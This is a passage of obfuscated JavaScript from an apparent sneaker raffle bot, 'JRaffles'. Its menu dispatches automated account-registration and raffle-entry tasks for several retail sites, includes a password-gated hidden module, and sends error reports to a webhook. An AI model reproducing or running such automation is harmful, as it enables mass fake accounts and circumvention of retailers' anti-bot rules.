                                if (taskFunction == 0x0) {
                                    var _0x12ff89 = await _0x3d2085(), _0x2aee84 = await _0x3ea38a(_0x478772);
                                    return _0x5450ed['shuffleTasks'] && await _0x383032(_0x2aee84), await _0x478772['function'](_0x478772, _0x2aee84, _0x12ff89), _0x40c650();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x12ff89 = await _0x3d2085();
                                        return await _0x478772['function'](_0x478772, null, _0x12ff89), _0x40c650();
                                    }
                                }
                                ;
                            } else {
                                if (_0x20cf41[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                                    var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x478772);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x20cf41[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                                        var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x12ff89 = await _0x3d2085(), _0x500d98 = await _0x3ea38a(_0x478772);
                                            return _0x5450ed['shuffleTasks'] && await _0x383032(_0x500d98), await _0x478772['function'](_0x478772, _0x500d98, _0x12ff89), _0x40c650();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x12ff89 = await _0x3d2085(), _0x500d98 = await _0x3ea38a(_0x478772);
                                                return _0x5450ed['shuffleTasks'] && await _0x383032(_0x500d98), await _0x478772['function'](_0x478772, _0x500d98, _0x12ff89), _0x40c650();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x20cf41[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                                            var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x12ff89 = await _0x3d2085(), _0x42c504 = await _0x3ea38a(_0x478772);
                                                return _0x5450ed['shuffleTasks'] && await _0x383032(_0x42c504), await _0x478772['function'](_0x478772, _0x42c504, _0x12ff89), _0x40c650();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x12ff89 = await _0x3d2085(), _0x42c504 = await _0x3ea38a(_0x478772);
                                                    return _0x5450ed['shuffleTasks'] && await _0x383032(_0x42c504), await _0x478772['function'](_0x478772, _0x42c504, _0x12ff89), _0x40c650();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x20cf41[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                                                var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x12ff89 = await _0x3d2085(), _0x1f06b0 = await _0x3ea38a(_0x478772);
                                                    return _0x5450ed['shuffleTasks'] && await _0x383032(_0x1f06b0), await _0x478772['function'](_0x478772, _0x1f06b0, _0x12ff89), _0x40c650();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x12ff89 = await _0x3d2085(), _0x1f06b0 = await _0x3ea38a(_0x478772);
                                                        return _0x5450ed['shuffleTasks'] && await _0x383032(_0x1f06b0), await _0x478772['function'](_0x478772, _0x1f06b0, _0x12ff89), _0x40c650();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x20cf41[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                                                    var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x12ff89 = await _0x3d2085(), _0x5cf005 = await _0x3ea38a(_0x478772);
                                                        return _0x5450ed['shuffleTasks'] && await _0x383032(_0x5cf005), await _0x478772['function'](_0x478772, _0x5cf005, _0x12ff89), _0x40c650();
                                                    }
                                                } else {
                                                    if (_0x20cf41[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x488ffe(0x3e8), _0x40c650();
                                                    else {
                                                        if (_0x20cf41[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x21ac73 = _0x20cf41[taskModule]['name'], _0x12ff89 = await _0x3d2085();
                                                            return await _0x13fff9(_0x21ac73, _0x12ff89), _0x40c650();
                                                        } else {
                                                            if (_0x20cf41[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x5cf0f3(_0x20cf41[taskModule]['modules']);
                                                                var _0x478772 = _0x20cf41[taskModule]['modules'][taskFunction];
                                                                return await _0x478772['function'](_0x478772), _0x40c650();
                                                            } else {
                                                                if (_0x20cf41[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x520370 = 0x0;
                                                                    for (const _0x53dbfb in _0x5450ed) {
                                                                        console['log']('(' + _0x520370 + ')\x20' + _0x53dbfb + '\x20:\x20' + _0x5450ed[_0x53dbfb]), _0x520370++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x520370 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x203466 = await _0x43834d();
                                                                    if (_0x203466 == _0x520370)
                                                                        return _0x40c650();
                                                                    console['clear'];
                                                                    var _0x439884 = 0x0;
                                                                    for (var _0x5ccbf5 in _0x5450ed) {
                                                                        if (_0x203466 == _0x439884) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x5ccbf5 + '\x20:'), _0x5450ed[_0x5ccbf5] = await _0x2e6d93(), _0x7d8dbf['writeFileSync']('../settings.json', JSON['stringify'](_0x5450ed));
                                                                            break;
                                                                        } else
                                                                            _0x439884++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x488ffe(0xbb8), _0x40c650();
                                                                } else {
                                                                    if (_0x20cf41[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x54c091(), _0x40c650();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x20cf41[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x213074 = await _0x3462cf();
                                                                            _0x213074 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x5376fe(), await afewFunction(_0x378a93[_0x13ca10], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x488ffe(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x40c650();
            } catch (_0x35f656) {
                return console['log'](_0x35f656), _0x40c650();
            }
        } catch (_0x3b1054) {
            return console['log'](_0x3b1054), await _0x488ffe(0x3a98);
        }
}
;
_0x55ca22('JRaffles\x20' + _0x21b502), _0x54c091();
try {
    _0x53799f();
} catch (_0x33161) {
    var _0x894988 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x15d59c
            },
            {
                'name': 'Version',
                'value': '' + _0x21b502
            },
            {
                'name': 'Error',
                'value': '' + _0x33161
            }
        ]
    }];
    const _0xe1af03 = { 'embeds': _0x894988 };
    _0x49f827(_0x47580b, _0xe1af03);
}